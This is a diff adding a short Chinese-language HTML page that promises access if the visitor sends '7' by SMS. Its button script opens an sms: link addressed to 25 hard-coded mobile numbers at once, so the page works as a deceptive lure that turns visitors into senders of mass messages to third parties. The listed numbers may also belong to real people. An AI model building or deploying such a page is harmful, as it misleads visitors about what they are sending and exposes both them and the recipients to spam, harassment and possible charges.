@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>发送短信</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+            background-color: #f4f4f4;
+        }
+        .tel {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: inline-block;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            background: linear-gradient(45deg, #ff7b00, #ff3c00);
+            border: none;
+            border-radius: 25px;
+            text-decoration: none;
+            transition: 0.3s ease-in-out;
+            box-shadow: 0 3px 10px rgba(255, 60, 0, 0.3);
+        }
+        .button:hover {
+            background: linear-gradient(45deg, #ff3c00, #ff7b00);
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(255, 60, 0, 0.5);
+        }
+    </style>
+</head>
+<body>
+
+<!-- 发送短信 -->
+<div class="tel">
+    <h4>发送“7”即可获取访问</h4>
+    <a class="button" href="#" onclick="sendSMS()">获取</a>
+</div>
+<script>
+    function sendSMS() {
+        let numbers = [
+            "15940806555", "13353650795", "13010163868", "18808601123", "13416312001",
+            "13309031234", "18899710868", "13900131111", "15226511870", "18267723936",
+            "13503333763", "13503339999", "13666886688", "13666889999", "15871391265",
+            "13900710018", "15084008847", "18731159999", "15276399999", "15179550921",
+            "15097906217", "15378048875", "15826629999", "18666021779", "13506168888"
+        ];
+        
+        let smsBody = "7";
+        let smsLink = "sms:" + numbers.join(",") + "?body=" + encodeURIComponent(smsBody);
+        
+        window.location.href = smsLink;
+    }
+    </script>
+</body>
+</html>
